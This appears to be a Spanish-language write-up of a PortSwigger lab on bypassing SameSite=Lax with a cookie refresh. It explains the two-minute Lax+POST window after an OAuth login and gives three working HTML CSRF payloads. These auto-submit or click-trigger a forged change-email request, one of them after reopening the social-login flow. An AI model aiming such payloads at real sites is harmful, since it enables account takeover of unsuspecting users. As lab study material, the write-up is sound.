---
layout: default
title: 10 - SameSite Lax bypass via cookie refresh
---
La cookie no tiene nada, asi que es Lax, no podemos convertir la petición de cambio de correo a GET de ninguna forma.

---

### 🤔 ¿Por qué entonces se envía en esta solicitud POST cross-site?

Esto se debe a una **excepción temporal** en navegadores antiguos o mal configurados, **cuando la cookie no tiene explícitamente el atributo `SameSite`**. Si el servidor omite `SameSite`, el navegador **aplica Lax por defecto** desde 2020 aproximadamente (por razones de seguridad).

Sin embargo, **durante los primeros minutos después de un login OAuth**, el navegador aún puede considerar la sesión "iniciada recientemente" y puede permitir una solicitud POST cross-site con cookies si:

1. La cookie **no tiene un atributo SameSite explícito**.
    
2. La sesión aún está activa y reciente.
    
3. El navegador no está implementando SameSite de forma estricta o tiene una excepción (esto varía entre navegadores y versiones).
    

---

### 🧪 Por qué funciona el ataque CSRF aquí

En el laboratorio:

- **No hay token CSRF** en la solicitud POST para cambiar el correo.
    
- La cookie de sesión **no tiene `SameSite` explícito**, por lo que se usa `Lax` por defecto.
    
- Al haber iniciado sesión recientemente, el navegador **todavía incluye la cookie en el POST**, incluso siendo una solicitud cross-site.
    

___

Esto funciona si han pasado menos de dos minutos desde que te has logueado:

```html
<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>
```

Esto no funciona porque las ventanas emergentes son bloqueadas por defecto:
```HTML
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

Aquí se envía una ventana emergente solo cuando el usuario clica, por lo que no es bloqueada
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```
